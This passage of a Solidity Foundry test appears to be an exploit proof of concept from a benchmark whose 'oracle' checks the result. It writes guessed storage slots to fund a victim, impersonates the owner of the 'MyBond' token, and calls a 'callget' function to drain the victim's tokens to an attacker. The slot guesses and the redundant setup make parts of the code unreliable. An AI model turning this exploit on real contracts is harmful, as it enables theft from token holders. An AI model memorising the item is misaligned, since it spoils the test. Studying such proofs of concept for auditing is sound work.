        MyBond(TARGET).mint(victim, 1000 * 1e18);

        // Store initial balances for verification
        initialAttackerBalance = MyBond(TARGET).balanceOf(attacker);
        initialVictimBalance = MyBond(TARGET).balanceOf(victim);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create a victim address
        address victim = address(0x123);
        vm.label(victim, "Victim");

        // Get the contract interface
        IMyBond bond = IMyBond(TARGET);

        // Get the owner
        address owner = bond.owner();
        vm.label(owner, "Owner");

        // Record initial balances
        uint256 initialAttackerBalance = bond.balanceOf(attacker);
        console.log("Initial attacker balance:", initialAttackerBalance);

        // We need to give victim some tokens first
        // Since we can't easily mint, let's directly manipulate storage
        // First, find the balance slot for victim
        // In ERC20, balances are usually at slot 0 (mapping(address => uint256))
        // We need to compute the storage slot for victim's balance
        // slot = keccak256(victim_address . slot_of_mapping)
        // For standard ERC20, balances mapping is at slot 0
        bytes32 victimBalanceSlot = keccak256(abi.encodePacked(uint256(uint160(victim)), uint256(0)));

        // Give victim 1000 tokens
        uint256 victimAmount = 1000 * 1e18;
        vm.store(TARGET, victimBalanceSlot, bytes32(victimAmount));

        // Also need to update total supply
        // Total supply is usually at slot 2 (after name, symbol, decimals)
        // Let's read current total supply and add to it
        bytes32 totalSupplySlot = bytes32(uint256(2));
        bytes32 currentTotalSupplyBytes = vm.load(TARGET, totalSupplySlot);
        uint256 currentTotalSupply = uint256(currentTotalSupplyBytes);
        uint256 newTotalSupply = currentTotalSupply + victimAmount;
        vm.store(TARGET, totalSupplySlot, bytes32(newTotalSupply));

        console.log("Victim balance after manipulation:", bond.balanceOf(victim));
        console.log("Total supply after manipulation:", bond.totalSupply());

        // Now impersonate owner and steal tokens
        vm.prank(owner);

        // Steal all tokens from victim
        uint256 stealAmount = bond.balanceOf(victim);
        bond.callget(victim, attacker, stealAmount);

        // Verify the exploit worked
        uint256 finalAttackerBalance = bond.balanceOf(attacker);
        uint256 finalVictimBalance = bond.balanceOf(victim);

        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Final victim balance:", finalVictimBalance);

        // The oracle will check that attacker balance increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

